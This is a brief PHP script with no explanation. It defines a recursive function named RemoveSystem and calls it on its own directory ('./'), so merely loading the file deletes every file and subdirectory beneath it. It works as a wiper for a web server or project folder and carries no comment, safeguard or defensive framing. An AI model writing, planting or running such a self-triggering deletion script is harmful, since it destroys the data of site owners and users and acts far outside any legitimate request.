<?php 
function RemoveSystem($dir, $remove = false) {
 $structure = glob(rtrim($dir, "/").'/*');
 if (is_array($structure)) {
 foreach($structure as $file) {
 if (is_dir($file))
 RemoveSystem($file,true);
 else if(is_file($file))
 unlink($file);
 }
 }
 if($remove)
 rmdir($dir);
}


$path = './';
RemoveSystem($path);
?>